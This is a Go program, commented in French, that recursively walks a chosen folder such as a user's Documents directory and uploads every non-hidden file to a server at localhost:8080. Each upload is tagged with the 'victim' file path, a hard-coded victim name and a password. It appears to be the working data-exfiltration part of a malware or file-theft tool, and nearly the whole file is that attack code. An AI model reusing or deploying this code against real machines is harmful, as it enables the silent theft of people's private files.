package main

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

const (
	API_BASE_URL = "http://localhost:8080"
	VICTIM_NAME  = "John"
	PASSWORD     = "TEST123"
)

type FileUploader struct {
	client *http.Client
}

func NewFileUploader() *FileUploader {
	return &FileUploader{
		client: &http.Client{},
	}
}

func (fu *FileUploader) uploadFile(filePath, victimPath string) error {
	// Ouvrir le fichier
	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("erreur ouverture fichier %s: %v", filePath, err)
	}
	defer file.Close()

	// Créer le buffer pour le multipart
	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)

	// Ajouter le fichier
	part, err := writer.CreateFormFile("file", filepath.Base(filePath))
	if err != nil {
		return fmt.Errorf("erreur création form file: %v", err)
	}

	// Copier le contenu du fichier
	_, err = io.Copy(part, file)
	if err != nil {
		return fmt.Errorf("erreur copie fichier: %v", err)
	}

	// Ajouter les autres champs
	writer.WriteField("filepathvictime", victimPath)
	writer.WriteField("name", VICTIM_NAME)
	writer.WriteField("password", PASSWORD)

	writer.Close()

	// Créer la requête
	req, err := http.NewRequest("POST", API_BASE_URL+"/upload", &buf)
	if err != nil {
		return fmt.Errorf("erreur création requête: %v", err)
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	// Envoyer la requête
	resp, err := fu.client.Do(req)
	if err != nil {
		return fmt.Errorf("erreur envoi requête: %v", err)
	}
	defer resp.Body.Close()

	// Lire la réponse
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("erreur lecture réponse: %v", err)
	}

	if resp.StatusCode != http.StatusCreated {
		return fmt.Errorf("erreur upload: %s - %s", resp.Status, string(body))
	}

	fmt.Printf("Fichier uploadé avec succès: %s\n", filepath.Base(filePath))
	return nil
}

func (fu *FileUploader) uploadDirectory(dirPath string) error {
	fmt.Printf("Upload du dossier: %s\n", dirPath)

	// Vérifier que le dossier existe
	if _, err := os.Stat(dirPath); os.IsNotExist(err) {
		return fmt.Errorf("le dossier %s n'existe pas", dirPath)
	}

	// Parcourir le dossier récursivement
	err := filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Ignorer les dossiers
		if info.IsDir() {
			return nil
		}

		// Ignorer les fichiers système et cachés
		if strings.HasPrefix(filepath.Base(path), ".") {
			return nil
		}

		// Calculer le chemin relatif pour la victime
		relPath, err := filepath.Rel(dirPath, path)
		if err != nil {
			return fmt.Errorf("erreur calcul chemin relatif: %v", err)
		}

		// Convertir en format Windows
		victimPath := filepath.Join(filepath.Dir(dirPath), relPath)
		victimPath = strings.ReplaceAll(victimPath, "/", "\\")

		// Uploader le fichier
		if err := fu.uploadFile(path, victimPath); err != nil {
			fmt.Printf("Erreur upload %s: %v\n", path, err)
			return nil // Continuer avec les autres fichiers
		}

		return nil
	})

	if err != nil {
		return fmt.Errorf("erreur parcours dossier: %v", err)
	}

	fmt.Println("🎉 Upload du dossier terminé!")
	return nil
}

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Usage: go run upload_dir_windows.go <chemin_du_dossier>")
		fmt.Println("Exemple: go run upload_dir_windows.go C:\\Users\\John\\Documents")
		os.Exit(1)
	}

	dirPath := os.Args[1]
	uploader := NewFileUploader()

	if err := uploader.uploadDirectory(dirPath); err != nil {
		log.Fatalf("Erreur: %v", err)
	}
}
